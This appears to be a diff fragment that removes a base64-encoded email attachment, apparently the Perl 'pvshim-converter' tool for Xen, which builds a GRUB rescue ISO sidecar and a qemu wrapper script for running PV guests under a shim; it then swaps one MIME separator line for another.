-ZiAkYy0+e3B2c2hpbV9leHRyYX07CgpvdXIgJGtlcm5lbF9jbWRsaW5lID0g
-JGMtPntjbWRsaW5lfSB8fCAnJzsKJGtlcm5lbF9jbWRsaW5lIC49ICcgcm9v
-dD0nLiRjLT57cm9vdH0gaWYgJGMtPntyb290fTsKJGtlcm5lbF9jbWRsaW5l
-IC49ICcgJy4kYy0+e2V4dHJhfSBpZiAkYy0+e2V4dHJhfTsKCnByaW50ICJw
-dnNoaW0tY29udmVydGVyOiBjcmVhdGluZyBzaWRlY2FyIGluICRzaWRlY2Fy
-XG4iOwoKcnVuY21kIHF3KG1rZGlyIC1tNzAwIC1wIC0tKSwgJHNpZGVjYXJz
-X2RpcjsKCm9wZW4gTCwgIj4iLCAiJHNpZGVjYXIubG9jayIgb3IgZGllICIk
-c2lkZWNhci5sb2NrOiBvcGVuICQhIjsKZmxvY2sgTCwgTE9DS19FWCBvciBk
-aWUgIiRzaWRlY2FyLmxvY2s6IGxvY2s6ICQhIjsKCm15ICRzZCA9ICIkc2lk
-ZWNhci5kaXIiOwoKc3lzdGVtIHF3KHJtIC1yZiAtLSksICRzZDsKbWtkaXIg
-JHNkLCAwNzAwOwoKcnVuY21kIHF3KGNwIC0tKSwgJHNoaW0sICIkc2Qvc2hp
-bSI7CnJ1bmNtZCBxdyhjcCAtLSksICRjLT57a2VybmVsfSwgIiRzZC9rZXJu
-ZWwiOwpydW5jbWQgcXcoY3AgLS0pLCAkYy0+e3JhbWRpc2t9LCAiJHNkL3Jh
-bWRpc2siIGlmICRjLT57cmFtZGlza307CgpteSAkZ3J1YmNmZyA9IDw8RU5E
-OwpzZXJpYWwgLS11bml0PTAgLS1zcGVlZD05NjAwIC0td29yZD04IC0tcGFy
-aXR5PW5vIC0tc3RvcD0xCnRlcm1pbmFsX2lucHV0IHNlcmlhbAp0ZXJtaW5h
-bF9vdXRwdXQgc2VyaWFsCgpzZXQgdGltZW91dD0wCgptZW51ZW50cnkgJ1hl
-biBzaGltJyB7CglpbnNtb2QgZ3ppbwoJaW5zbW9kIHh6aW8KICAgICAgICBt
-dWx0aWJvb3QgKGNkKS9zaGltIHBsYWNlaG9sZGVyICRzaGltX2NtZGxpbmUK
-ICAgICAgICBtb2R1bGUgKGNkKS9rZXJuZWwgcGxhY2Vob2xkZXIgJGtlcm5l
-bF9jbWRsaW5lCiAgICAgICAgbW9kdWxlIChjZCkvcmFtZGlzawp9CkVORAoK
-cnVuY21kIHF3KG1rZGlyIC1wIC0tKSwgIiRzZC9ib290L2dydWIiOwpvcGVu
-IEcsICI+IiwgIiRzZC9ib290L2dydWIvZ3J1Yi5jZmciIG9yIGRpZSAiJHNk
-LCBncnViLmNmZzogJCEiOwpwcmludCBHICRncnViY2ZnIG9yIGRpZSAkITsK
-Y2xvc2UgRyBvciBkaWUgJCE7Cgp1bmxpbmsgIiRzaWRlY2FyLm5ldyIgb3Ig
-JCE9PUVOT0VOVCBvciBkaWUgIiRzaWRlY2FyLm5ldzogcm06ICQhIjsKcnVu
-Y21kIHF3KGdydWItbWtyZXNjdWUgLW8pLCAiJHNpZGVjYXIubmV3IiwgIiRz
-aWRlY2FyLmRpciI7CmlmICghc3RhdCAiJHNpZGVjYXIubmV3IikgewogICAg
-JCE9PUVOT0VOVCBvciBkaWUgIiRzaWRlY2FyLm5ldzogc3RhdDogJCEiOwoK
-ICAgIHByaW50IFNUREVSUiA8PEVORDsKcHZzaGltLWNvbnZlcnRlcjogZ3J1
-Yi1ta3Jlc2N1ZSBleGl0ZWQgd2l0aCBzdGF0dXMgemVybyBidXQgZmFpbGVk
-IHRvIG1ha2UgaXNvLgpOQiB0aGF0IGdydWItbWtyZXNjdWUgaGFzIGEgdGVu
-ZGVuY3kgdG8gbGllIGluIGl0cyBlcnJvciBtZXNzYWdlcy4KRU5ECiAgICBt
-eSAkbWlzc2luZzsKICAgIGZvcmVhY2ggbXkgJGNoZWNrIChxdyh4b3JyaXNv
-IG1mb3JtYXQpKSB7CiAgICAgICAgJG1pc3NpbmcgfD0gc3lzdGVtIHF3KHNo
-IC1jKSwgInR5cGUgJGNoZWNrIjsKICAgIH0KCiAgICBpZiAoJG1pc3Npbmcp
-IHsKICAgICAgICBwcmludCBTVERFUlIgPDxFTkQ7CllvdSBzZWVtIHRvIGhh
-dmUgc29tZSBwcm9ncmFtKHMpIG1pc3Npbmcgd2hpY2ggZ3J1Yi1ta3Jlc2N1
-ZSBkZXBlbmRzIG9uLApzZWUgYWJvdmUuICAoIm1mb3JtYXQiIGlzIG5vcm1h
-bGx5IGluIHRoZSBwYWNrYWdlICJtdG9vbHMiLikKSW5zdGFsbGluZyB0aG9z
-ZSBwcm9ncmFtcyB3aWxsIHByb2JhYmx5IGhlbHAuCkVORAogICAgfSBlbHNl
-IHsKICAgICAgICBwcmludCBTVERFUlIgPDxFTkQ7CkFuZCBvbGRlciBncnVi
-LW1rcmVzY3VlIGhhcyBhIHRlbmRlbmN5IG5vdCB0byBub3RpY2UgY2VydGFp
-biBwcm9ibGVtcy4KTWF5YmUgc3RyYWNlIHdpbGwgdGVsbCB5b3Ugd2hhdCBp
-cyB3cm9uZy4gIDotLwpFTkQKICAgIH0KICAgIGRpZSAicHZzaGltLWNvbnZl
-cnRlcjogZ3J1Yi1ta3Jlc2N1ZSBkaWQgbm90IG1ha2UgaXNvXG4iOwp9Cgpy
-dW5jbWQgcXcocm0gLXJmIC0tKSwgIiRzaWRlY2FyLmRpciIgdW5sZXNzICRk
-ZWJ1ZzsKCm9wZW4gUSwgIj4iLCAiJGRtd3JhcC5uZXciIG9yIGRpZSAiJGRt
-d3JhcDogJCEiOwpwcmludCBRIDw8J0VORF9ETVdSQVAnIG9yIGRpZSAkITsK
-IyEvYmluL2Jhc2gKCnNldCAteAo6ICIkQCIKc2V0ICt4CgpuZXdhcmdzPSgp
-CgpuZXdhcmcgKCkgewogICAgbmV3YXJncys9KCIkMSIpCn0KCndoaWxlIFsg
-JCMgLWd0IDEgXTsgZG8KICAgIGNhc2UgIiQxIiBpbgoJLW5vLXNodXRkb3du
-fC1ub2RlZmF1bHRzfC1uby11c2VyLWNvbmZpZykKCSAgICBuZXdhcmcgIiQx
-Ijsgc2hpZnQKCSAgICA7OwoJLXhlbi1kb21pZHwtY2hhcmRldnwtbW9ufC1k
-aXNwbGF5fC1ib290fC1tfC1tYWNoaW5lKQoJICAgIG5ld2FyZyAiJDEiOyBz
-aGlmdAoJICAgIG5ld2FyZyAiJDEiOyBzaGlmdAoJICAgIDs7CiAgICAgICAg
-LW5hbWUpCiAgICAgICAgICAgIG5ld2FyZyAiJDEiOyBzaGlmdAogICAgICAg
-ICAgICBuYW1lPSIkMSI7IHNoaWZ0CiAgICAgICAgICAgIG5ld2FyZyAiJG5h
-bWUiCiAgICAgICAgICAgIDs7CgktbmV0ZGV2fC1jZHJvbSkKCSAgICA6IGZp
-eG1lCgkgICAgbmV3YXJnICIkMSI7IHNoaWZ0CgkgICAgbmV3YXJnICIkMSI7
-IHNoaWZ0CgkgICAgOzsKCS1kcml2ZXwta2VybmVsfC1pbml0cmR8LWFwcGVu
-ZHwtdm5jKQoJICAgIHNoaWZ0OyBzaGlmdAoJICAgIDs7CgktZGV2aWNlKQoJ
-ICAgIHNoaWZ0CgkgICAgY2FzZSAiJDEiIGluCgkJWFhYcnRsODEzOSopCgkJ
-ICAgIG5ld2FyZyAiLWRldmljZSIKCQkgICAgbmV3YXJnICIkMSI7IHNoaWZ0
-CgkJICAgIDs7CgkJKikKCQkgICAgc2hpZnQKCQkgICAgOzsKCSAgICBlc2Fj
-CgkgICAgOzsKCSopCgkgICAgZWNobyA+JjIgIndhcm5pbmc6IHVuZXhwZWN0
-ZWQgYXJndW1lbnQgJDEgYmVpbmcgcGFzc2VkIHRocm91Z2giCgkgICAgbmV3
-YXJnICIkMSI7IHNoaWZ0CgkgICAgOzsKICAgIGVzYWMKZG9uZQoKI2lmIFsg
-IngkbmFtZSIgIT0geCBdOyB0aGVuCiMgICAgbG9nZGlyPS92YXIvbG9nL3hl
-bgojICAgIGxvZ2ZpbGU9IiRsb2dkaXIvc2hpbS0kbmFtZS5sb2ciCiMgICAg
-c2F2ZWxvZyAiJGxvZ2ZpbGUiIHx8OgojICAgIG5ld2FyZyAtc2VyaWFsCiMg
-ICAgbmV3YXJnICJmaWxlOiRsb2dmaWxlIgojZmkKRU5EX0RNV1JBUAoKaWYg
-KCRxZW11KSB7CiAgICBwcmludGYgUSA8PCdFTkRfRE1XUkFQJywgJHFlbXUg
-b3IgZGllICQhOwogICAgZXhlYyAnJXMnICIke25ld2FyZ3NbQF19IgpFTkRf
-RE1XUkFQCn0gZWxzZSB7CiAgICBwcmludCBRIDw8J0VORF9ETVdSQVAnIG9y
-IGRpZSAkITsKc2V0IC14CmZvciBwYXRoIGluIC91c3IvbG9jYWwvbGliL3hl
-bi9iaW4gL3Vzci9saWIveGVuL2JpbiAvdXNyL2xvY2FsL2JpbiAvdXNyL2Jp
-bjsgZG8KICAgIGlmIHRlc3QgLWUgJHBhdGgvcWVtdS1zeXN0ZW0taTM4Njsg
-dGhlbgogICAgICAgIGV4ZWMgJHBhdGgvcWVtdS1zeXN0ZW0taTM4NiAiJHtu
-ZXdhcmdzW0BdfSIKICAgIGZpCmRvbmUKZWNobyA+JjIgJ2NvdWxkIG5vdCBl
-eGVjIHFlbXUnCmV4aXQgMTI3CkVORF9ETVdSQVAKfQoKY2htb2QgMDc1NSwg
-IiRkbXdyYXAubmV3IiBvciBkaWUgIiRkbXdyYXA6IGNobW9kOiAkISI7Cgpj
-bG9zZSBRIG9yIGRpZSAkITsKCnJlbmFtZSAiJHNpZGVjYXIubmV3IiwgJHNp
-ZGVjYXIgb3IgZGllICIkc2lkZWNhcjogaW5zdGFsbDogJCEiOwpyZW5hbWUg
-IiRkbXdyYXAubmV3IiwgICRkbXdyYXAgIG9yIGRpZSAiJGRtd3JhcDogaW5z
-dGFsbDogJCEiOwoKcHJpbnQgU1RERVJSIDw8RU5EOwpwdnNoaW0tY29udmVy
-dGVyOiB3cm90ZSBxZW11IHdyYXBwZXIgdG8gJGRtd3JhcApwdnNoaW0tY29u
-dmVydGVyOiB3cm90ZSBzaWRlY2FyIHRvICRzaWRlY2FyCkVORAoKbXkgJGFw
-cGVuZCA9IDw8RU5EOwpidWlsZGVyPSdodm0nCnR5cGU9J2h2bScKZGV2aWNl
-X21vZGVsX3ZlcnNpb249J3FlbXUteGVuJwpkZXZpY2VfbW9kZWxfb3ZlcnJp
-ZGU9JyRkbXdyYXAnCmRldmljZV9tb2RlbF9hcmdzX2h2bT1bJy1jZHJvbScs
-JyRzaWRlY2FyJ10KYm9vdD0nYycKc2VyaWFsPSdwdHknCkVORAoKaWYgKCRv
-dXQgbmUgJy0nKSB7CiAgICBvcGVuIE8sICI+IiwgIiRvdXQudG1wIiBvciBk
-aWUgIm9wZW4gb3V0cHV0IGNvbmZpZyB0ZW1wOiAkb3V0LnRtcDogJCFcbiI7
-Cn0gZWxzZSB7CiAgICBvcGVuIE8sICI+JlNURE9VVCIgb3IgZGllICQhOwp9
-CgpwcmludCBPICRpbmRhdGEsICJcbiIsICRhcHBlbmQgb3IgZGllICJ3cml0
-ZSBvdXRwdXQ6ICQhIjsKY2xvc2UgTyBvciBkaWUgImNsb3NlIG91dHB1dDog
-JCEiOwoKaWYgKCRvdXQgbmUgJy0nKSB7CiAgICByZW5hbWUgIiRvdXQudG1w
-IiwgJG91dCBvciBkaWUgImluc3RhbGwgb3V0cHV0OiAkISI7CiAgICBwcmlu
-dCBTVERFUlIgInB2c2hpbS1jb252ZXJ0ZXI6IHdyb3RlIG5ldyBndWVzdCBj
-b25maWcgdG8gJG91dFxuIjsKfSBlbHNlIHsKICAgIHByaW50IFNUREVSUiAi
-cHZzaGltLWNvbnZlcnRlcjogd3JvdGUgbmV3IGd1ZXN0IGNvbmZpZyB0byBz
-dGRvdXRcbiI7Cn0K
-
---=separator--
+--DGrPi0DeKwvjcwM8fGZYN4soYh03alDfs--
